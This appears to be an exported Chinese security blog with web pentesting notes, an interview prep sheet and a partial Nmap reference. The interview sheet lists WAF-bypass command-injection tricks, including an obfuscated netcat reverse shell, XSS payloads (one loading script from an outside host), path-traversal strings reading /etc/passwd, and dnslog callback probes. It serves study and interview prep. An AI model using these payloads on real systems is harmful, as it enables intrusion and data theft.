以许某为骨干的菲律宾黑客团伙主要攻击入侵国内的新闻、学校、政府机关网站，通过寻找此类网站漏洞，植入木马病毒，控制网站服务器，加挂黑链自动链接博彩网站，或把境外博彩公司链接地址保存在搜索引擎内，当用户访问网站时，网站会自动跳转至境外博彩公司网页；用搜索引擎搜索“时时彩、博彩”等关键字时，就会优先显示境外博彩公司地址，以达到加大博彩公司访问量，吸引更多人参与赌博的目的。 反共黑客的黑页 反共黑客是反对中国共产党的黑客组织，其手段是通过掌握中国境内大量网站漏洞，采用预先植入后门等手段，控制一些网站服务器，持续篡改中国境内政府和重要信息系统部门、企事业单位网站，并在篡改页面上发布反对中国共产党言论。不过亦有针对广播电视网络的攻击。到2013年为止，它至少入侵了600余个中国境内网站。 网站暗链 正如其名，暗链就是指看不见的网站链接。由于暗链的嵌入做的十分隐蔽，短时间内很难被察觉，更不会自动跳转。这种连接类似于友情链接，对于单独页面可以有效提高其PR值。暗链分为两种情况，一种是主动隐藏别人网站的链接，另一种则是盗取自己的模板进而在上面保存很多自己的绝对地址。一般情况下，黑客通过设置使链接在页面不可见，但实际又存在，可以通过源码查看。通常方式有如设置css，使div等不可见或者使div的边距为负数，总之只要在页面上看不到就行，其位置一般处在源码的底部或者顶部。 发现漏洞黑盒测试 渗透测试人员在事前完全不了解任何目标内部信息，例如网络拓扑、应用、系统等信息，对目标系统进行渗透测试。黑盒测试所使用的时间相对较⻓，并且对于渗透人员的技术能力要求相对高一些。 白盒测试 渗透测试人员在事前已经获取目标内部信息，例如网络拓扑、应用、系统、源代码等信息，对目标系统进行渗透测试。对比黑盒测试，白盒测试往往能用最小的代价，发现目标更多的安全隐患。具体漏洞细节又包括：Google Hack、目录扫描、Web漏洞扫描、暴力破解、信息泄露、任意文件上传、SQL 注入漏洞、XSS漏洞、CSRF 漏洞、SSRF 漏洞、任意文件下载读取删除漏洞、越权漏洞、业务逻辑漏洞、XXE漏洞、Xpath注入漏洞、反序列化漏洞、Web框架漏洞、弱口令、命令执行漏洞、拒绝服务攻击漏洞等 PTES 渗透测试 前期交互在进行渗透测试之前，渗透测试团队需要与客户组织交互讨论，确定渗透测试目标、渗透测试范围、渗透测试限制条件、服务合同等细节进行商议，达成一致协议。 需要收集客户需求，根据商定的目标、范围、限制条件，项目管理与规划等信息来确定渗透测试方案。 信息收集 根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利。 系统信息 业务信息 根据确定的渗透测试目标以及范围，使用各种手段尽可能的收集与测试目标相关的信息。例如开源情报(OSINT)、Google Hacking、扫描探测等。收集到的信息越充分对之后的渗透测试越有利 渗透测试的本质就是信息收集 威胁建模 攻击规划 攻击渗透渗透测试团队需要对收集到的信息进行分析并且做出攻击的规划，确定出最有效、最可行的攻击方案。 漏洞分析 应用漏洞 业务漏洞根据攻击方案，需要挖掘可利用的漏洞来获取目标系统的访问控制权限。通过分析信息收集到的数据，比如系统信息、漏洞扫描结果等，进行验证并发现漏洞。挖掘目标系统中可利用的潜在漏洞，并开发EXP脚本。渗透攻击利用发现的安全漏洞或编写好的漏洞利用程序（Exploit）来入侵目标系统，获得访问控制权。 渗透攻击 入侵攻击 获取权限过程中可能会因为Exp的兼容性，需要对其进行修改或额外研究。还需要考虑对目标系统的安全机制进行逃逸，避免被发现。 后渗透攻击 内网渗透 资料整理 需要渗透测试团队根据目标组织的业务经营模式、资产保护模式和安全防御规划的不同特点，资助设计出攻击目标，识别关键基础设施，并寻找客户组织组织最具价值和尝试安全保护的信息和资产，最终达到能够对客户组织造成最重要业务影响的攻击途径。 渗透报告渗透测试报告中会涵盖之前所有阶段所收集的关键情报信息、挖掘出的安全漏洞、成功渗透攻击的过程、造成业务影响后果的攻击途径。从防御⻆度考虑的安全防御体系存在的薄弱点、⻛险以及修复建议。 专业术语 POC（Proof of Concept）：概念验证，用于验证安全漏洞是否存在，能否被利用。 EXP（Exploit）：漏洞利用程序，利用安全漏洞造成入侵或破坏效果的程序。 Payload，有效荷载、攻击载荷，目标系统被渗透攻击之后所执行的代码。 安全漏洞是存在生命周期的，简单的可以分为几个阶段： 漏洞被发现 漏洞/Exploit信息披露公布 漏洞具有官方补丁或修复方案 同时也繁生出几个概念，分为是： 0day，漏洞信息未公布时，这时利用 EXP 可以通杀。 1day，漏洞信息被公布，但漏洞没有官方补丁或者修复方案，这时利用 EXP 可以入侵大部分系统。 Nday，漏洞已有官方补丁或者修复方案，这时利用 EXP 只能入侵还未及时修复的系统。 Web服务端概述在 Web 的世界中，分为客户端与服务端。客户端就是我们常用的浏览器，服务端是提供 Web 服务的服务器。 静态网页与动态网页的区别 web服务器IIS,apache,tomcat,nginx (负载均衡好，抗压能力强) 静态网页静态网⻚是以.htm、.html为后缀的文件 动态网页动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件 访问静态网⻚流程 服务端中真正接收处理报文的是 Web 应用服务器（Web容器、中间件）。常⻅的Web 应用服务器有 Apache、IIS、Tomcat、Nginx等等。Web应用服务器是专⻔用于提供HTTP服务，它会处理接收到的HTTP请求，最后构建HTTP报文进行响应。 从宏观的层面来简单的理解 Web 应用服务器处理 HTTP 报文的过程，以Apache为例： 访问动态网⻚流程访问的动态网⻚一般是以 .php、.jsp、.asp、.aspx 为后缀的文件。这些文件的内容一般是由 HTML+CSS+JavaScript+后端语言代码构成。例如 .php 的后缀的文件，文件内容中就会带有PHP代码。 动态网⻚的大致请求过程如下： Web服务架构 LNMP：Linux、Nginx、MySQL、PHP LAMP：Linux、Apache、MySQL、PHP 常⻅的 Web 服务架构： 操作系统 Web应用服务器 动态脚本引擎 数据库服务 数据库端口 Windows IIS ASP(.NET) SQLServer 1433 Windows/Linux Apache/Nginx PHP MySQL 3306 Windows/Linux Tomcat JSP Oracle 1521 URL 与 URL 编码URL简介统一资源定位符（Uniform Resource Locator，常缩写为URL），有时也被俗称为网页地址（网址）。![url格式] 协议类型:[//服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]下是常⻅的 URL 编码字符： 字符 URL编码 = %3d # %23 % %25 &amp; %26 / %2f 空格 %20 换行 %0a 空字节 %00 另一个值得注意的编码字符是加号（+），它也可以代表 URL 编码的空格。 浏览器发送数据时自动对url进行编码 HTTP 协议报文HTTP（HyperText Transfer Protocol）既超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则。 http协议简介HTTP协议它遵循请求(Request)/应答(Response)模型，浏览器向服务器发送请求时，Web服务器处理请求并返回适当的应答。所以在发送一次HTTP请求会产生两类报文，分别是请求报文与响应报文。它也是一种无状态的协议。 无状态意味着当一个客户端向服务器端发送请求，然后Web服务器返回响应(Response)，连接就被关闭了。在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起 HTTP 请求报文HTTP 请求报文由请求行、请求头部、空行和请求数据4个部分组成 请求行 HTTP 协议的请求方法有GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT。 GET请求GET 是最常用的方法。通常用于请求服务器发送某个资源。 在 GET 请求中，查询字符串是在 URL 中发送的： 1/index.php?r=default/news/content&amp;id=1 URL 是存在⻓度限制的，所以 GET 请求所传递的数据是有限的 POST请求在 POST 请求中，查询字符串是在 POST 请求的 请求正文中发送的： 1name=123&amp;word=123&amp;cooktime=0&amp;checkcode=7926 POST 请求的数据是没有大小限制的 HEAD请求HEAD 方法与 GET 方法的行为很类似，但服务器在响应中只返回首部，不会返回实体的主体部分。所以速度比GET快。通过查看响应中的状态码，看看某个对象是否存在。 扫描器经常使用HEAD方法。 PUT请求与 GET 从服务器读取文档相反，PUT 方法会向服务器写入文档。如果文件已经存在，则覆盖。 IIS6 PUT 漏洞 DELETE请求DELETE 方法所做的事情就是请服务器删除请求 URL 所指定的资源 OPTIONS请求OPTIONS 方法请求 Web 服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支持哪些方法。 拓展方法扩展方法 指的就是没有在 HTTP/1.1 规范中定义的方法。服务器会为它所管理的资源实现一 些 HTTP 服务，这些方法为开发者提供了一种扩展这些 HTTP 服务能力的手段。 方法 描述 LOCK 允许用户“锁定”资源——比如，可以在编辑某个资源的时候将其锁定，以防别人同时对其进行修改。 MKCOL 允许用户创建资源 COPY 便于在服务器上复制资源MOVE在服务器上移动资源 请求头部请求头部用来告知服务器有关于客户端请求的信息，由关键字/值对组成，每行一对，关键字和值用英文冒号:分隔: 请求头部详解 HTTP响应报文HTTP响应报文由状态行、消息报头、空行、响应正文4个部分组成： 状态行状态行由HTTP协议版本、状态码和状态描述3个字段组成，它们用空格分隔。状态码是客户端理解事务处理结果的快捷方式。有以下类型组成: 状态码 描述 1xx 指示信息–表示请求已接收，继续处理 2xx 成功–表示请求已被成功接收、理解、接受 3xx 重定向–要完成请求必须进行更进一步的操作 4xx 客户端错误–请求有语法错误或请求无法实现 5xx 服务器端错误–服务器未能实现合法的请求 常⻅状态码描述： 状态码 原因 短语含义 200 OK 客户端请求成功没有问题 302 Found 重定向，客户端应该使用 Location 首部给出的URL 来临时定位资源 304 Not Modified 直接使用本地缓存 400 Bad Request 客户端请求有语法错误，不能被服务器所理解 401 Unauthorized 请求未经授权认证 403 Forbidden 服务器收到请求，但是拒绝提供服务访问一个网站目录常出现这种情况 404 Not Found 请求资源不存在 405 Method NotAllowed 发请求中带有所请求的方法不允许 500 InternalServer Error 服务器发生不可预期的错误 502 BadGateway 无法连接到其父网关 503 ServiceUnavailable 服务器当前不能处理客户端的请求 响应头部响应头部用来描述服务器信息的，由关键字/值对组成，每行一对，关键字和值用英文冒号:分隔: 响应正文响应正文会返回请求资源的源码信息，然后这些源码通过浏览器渲染就呈现出我们所看到的效果: Http与HttpsHTTP是不安全的，它具有许多安全⻛险： 窃听⻛险：黑客可以获知通信内容。 篡改⻛险：黑客可以修改通信内容。 冒充⻛险：黑客可以冒充他人身份参与通信。 HTTPS（HyperText Transfer Protocol over Secure Socket Layer），它的基础是SLL/TLS，既在HTTP下加入 SSL/TLS层。 HTTPS通过安全传输机制进行传送数据，这种机制可以保护网络传送的所有数据的隐秘性与完整性 Cookie 与 Session 原理简介 由 HTTP 协议是无连接无状态的，所以 HTTP 协议无法记住客户端的信息。为了弥补HTTP协议这两点的“不足”，所以出现了会话技术。一个是 Cookie，而另一个则是 Session。 CookieCookie 是由服务器端生成，服务器将数据通过 HTTP 响应存储到浏览器上，这就是 Cookie。浏览器可以在以后携带对应的 Cookie 数据访问服务器 SessionSession 与浏览器无关，但是与 Cookie 有关。Session 是以 Cookie 为基础，将重要的数据保存在服务器端，同时将能够唯一表示这份数据的数据以 cookie 的形式保存在客户端。 第一次访问： 创建SessionId 初始化超全局变量$_SESSION 在php指定目录创建以SESSIONId为名的文件 脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并将SESSIONID以SETCOOKIE的形式返回给客户端 第二次访问： 检测到客户端的COOKIE中的SESSIONID 初始化超全局变量$_SESSION 找到文件，反序列化读取数据存储到$_SESSION中。 脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。 web应用判断用户登录 当用户提交的帐号密码正确后，服务端会使用SESSION将用户信息存储到服务端。并将SESSIONID以SETCOOKIE的形式返回给客户端。 当用户第二次访问站点时，会自动带上COOKIE信息，那么服务端会根据COOKIE中的SESSIONID进行匹配数据。如果存在数据，则说明已经登录过，为登录状态。如果不存在数据，则说明没有登录，为未登录状态 渗透测试环境与工具工欲善其事，必先利其器 操作系统 Windows 10 优点：WSL、国产工具比较多 缺点：Docker 安装、游戏丰富多彩 Linux（Ubuntu、Deepin、Kali） 优点：国际工具兼容性好 缺点：exe 小工具无法运行、软件生态不好 macOS 优点：软件生态好、Uninx血统 缺点：国产小工具得开虚拟机 浏览器Chome 插件名 说明 Charset 修改网站的默认编码 Fatkun 图片批量下载批量爬取下载图片神器 Link Grabber 批量提取网⻚链接 ProxySwitchyOmega 轻松快捷地管理和切换多个代理 Shodan 信息收集插件之端口探测 Tampermonkey 支持各种强大的插件 uBlacklist 禁止特定的网站显示在 Google的搜索结果中 Wappalyzer 网站指纹基础信息探测超级简单的自动刷新顾名思义，自动刷新 Fiefox 完美适配Hackbar：https://wws.lanzous.com/iRZjdfc8mjg 插件名 说明 ProxySwitchyOmega 轻松快捷地管理和切换多个代理 Hackbar 半自动化注入必备 Hackbar https://wws.lanzous.com/ilIDXfc8n2f | 工具推荐 工具 说明 AWVS 13 经典的自动化 Web 漏洞扫描神器 antSword 实用强大 Webshell 管理工具 antSwordBehinder “冰蝎”动态二进制加密网站管理客户端 BurpSuite 渗透测试抓包改包必备 Cmder Windows 下 Cmd 增强 Cobalt Strike 内网渗透代理神器 CSdirsearch 强大的目录扫描工具 dirsearch sqlmapSQL 注入必备神器 Terminus 跨平台高颜值的终端 Typora 跨平台使用的 Markdown 编辑器 Metasploit 知名开源的漏洞攻击框架 mimikatz 读取已经登录过的用户Hash和明文密码 MobaXtermWindows 下好用的终端，支持多协议 NavicatPremium 强大的第三方数据库管理工具 Nmap 端口扫描必备工具 phpStudy 2018版 Windows 下经典的 PHP 环境搭建工具 WebRobot 比较好用的爬虫工具 VSCode 开源强大跨平台的编辑器 zenmap Nmap 的官方图形化界面]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安服面经]]></title>
    <url>%2F%2F2020%2F06%2F6a2e2a4a.html</url>
    <content type="text"><![CDATA[渗透测试基本流程1.信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等 传输协议，通用漏洞，exp，github源码等 2.漏洞挖掘 XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等 3.漏洞利用|提权 mysql提权，linux系统提权 4.编写报告|清除测试数据 5.漏洞复测 sqlmap的运行机理 尝试连接目标网站 确认目标网站是否为动态网页 通过报错确认数据库的类型 添加payload进行测试 测试出注入类型后会对数据库版本进行猜测 最后的出结论 .htaccess利用 htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。 .htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。 用连续的弹出图片骚扰用户 可以上传图片马，将jpg文件解析为php文件 sql注入原理及防御原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 防御： 关闭错误提示，php.ini中的display_errors=Off 魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。 通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。 使用转义字符 命令执行命令执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 命令执行漏洞利用条件： 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严漏洞分类： 代码层过滤不严 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”); 系统的漏洞造成命令注入 bash破壳漏洞（CVE-2014-6271） 调用的第三方组件存在代码执行漏洞 如wordPress中用来处理图片的imageMagick组件JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP命令执行 漏洞危害： 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 命令拼接符|、||、&amp;、&amp;&amp;的区别：&amp;：无论左边是false还是true，右边都执行&amp;&amp;：具有短路效果，左边是false，右边不执行。|:无论左边是false还是true，右边都会执行||：具有短路效果，左边是true，右边不执行。 代码执行： 利用系统函数实现命令执行，在php下，允许命令执行的函数有：eval（）、assert（）、preg_replace（）、call_user_func（）如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞 其他函数ob_start（）、unserialize（）、creat_function（）、usort（）、uasort（）、uksort（）、array_filter（）、array_reduce（）、array_map（）…… 系统命令执行漏洞 system（） exec（） shell_exec（） passthru（） pcntl_exec（） popen（） proc_open（） 反引号…… 命令执行WAF绕过技巧 技巧一：通配符ls-l使用通配符/?in/?s-l /???/??t /??c/p???w?有时候WAF不允许使用太多的？号/?in/cat/?tc/p?sswd NC反弹shell:nc -e /bin/bash 127.0.0.1 3737为了避免符号，可以将IP地址转换成整型。127.0.0.1-&gt;2130706433 使用通配符root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737 技巧二：连接符 技巧三：未初始化的bash变量在bash环境中允许我们使用未初始化的bash变量，如何$a ,$b,$c我们事先并没有定义它们，输出看看:root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~#未初始化的变量值都是null 读取/etc/passwd:cat$a /etc$a/passwd$a 测试WAF测试代码：&lt;?phpecho “OK”;system(‘dig’.$_GET[‘host’]);?&gt; www.baidu.com;$s/bin$s/which$s nc$s反弹shell:/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737 漏洞修复： 尽量少用执行命令的函数或者直接禁用 参数值尽量使用引号包括 在使用动态函数之前，确保使用的函数是指定的函数之一 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义 对PHP语言来说，不能完全控制的危险函数最好不要使用 XSS漏洞​ 恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。 反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。 DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 防御： 进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter 开启HttpOnly，解决xss后的cookie劫持问题 进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 防御： 同源检测 禁止不受信任的域名对我们发起请求。 Origin Header Referer Header CSRF Token a. 将CSRF Token输出到页面中 b. 页面提交的请求携带这个Token c. 服务器验证Token是否正确 双重cookie验证 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间） Samesite Cookie 属性 SSRF通常用于控制web进而探测内网服务以及拥挤内网脆弱应用 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 利用： file协议查看文件 dict协议探测端口 gopher协力支持get&amp;post请求 防御： 限制协议为HTTP，HTTPS 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 文件上传漏洞程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 造成文件上传漏洞的原因有： 开源编辑器的上传漏洞 服务器配置不当 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 绕过： %00 截断绕过 文件名绕过 大小写绕过 php2 php3 php5 phtml Content-Type绕过 前端js绕过 Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 防御 将文件上传的目录设置为不可执行 判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式 使用随机数改写文件名和文件路径。 常用web漏洞测试的payload整理[反射型xss] [在html形成] 123&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt; [在js形成] 123456document.title=&quot;[random]&quot;;//;document.title=&quot;[random]&quot;;//&quot;;document.title=&quot;[random]&quot;;&apos;;document.title=&quot;[random]&quot;;&quot;);document.title=&quot;[random]&quot;;&apos;);document.title=&quot;[random]&quot;; [在html属性形成(img)] 123888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;888 οnlοad=document.title=&quot;[random]&quot; [存储型xss] [通用payload]测试环境，需要在触发的地方查看payload显示情况 1234567891011121314151617181920&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;[Bypass on Event] [事件型绕过]&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt; #一般富文本不会过滤img标签[Bypass pseudo protocol] [伪协议绕过]&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;[Bypass html5 tag] [html5标签绕过]&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;如果进行盲测可以根据xss平台地址替换相应的js触发代码&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt; [静态文件读取] [常规检测] 123/../../../../../../../../../../../etc/passwd/../../../../../../../../../../../etc/hosts/../../../../../../../C:/Windows/system.ini [windows] [伪造绕过] 123456/././././././././././././././././././././././././../../../../../../etc/passwd/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts [后缀绕过] 1234567891011/../../../../../../../../../../../etc/passwd#/../../../../../../../../../../../etc/passwd%00/../../../../../../../../../../../etc/passwd#.jpg/../../../../../../../../../../../etc/passwd%00.jpg/../../../../../../../../../../../etc/passwd#.html/../../../../../../../../../../../etc/passwd%00.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html [命令执行漏洞] [常规检测] 1234;curl [random].test.dnslog.link | curl [random].test.dnslog.link | ping -n 2 [random].test.dnslog.link [Windows] | ping -c 2 [random].test.dnslog.link [Linux] [绕过检测] 123456789101112;curl [random].test.dnslog.link# | curl [random].test.dnslog.link#%20|%20curl%20[random].test.dnslog.link%20|%20curl%20[random].test.dnslog.link#%20|%20ping%20-n%202%20[random].test.dnslog.link%20|%20ping%20-c%202%20[random].test.dnslog.link#a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.linka=c;b=url;$a$b [random].test.dnslog.link#$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.linka=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.linka=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link# [ssrf漏洞] 1http://[random].test.dnslog.link/ [strust2命令执行] 1?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap常用参数]]></title>
    <url>%2F%2F2020%2F06%2F868037e0.html</url>
    <content type="text"><![CDATA[nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描目标格式 示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL:从文件中加载目标 -iR:随机扫描 –exclude :排除网段或主机地址 –excledefile:排除文件中的地址 主机发现 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器 –system-dns:调用系统的DNS服务器 –traceroute：显示追踪到目标的路径 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 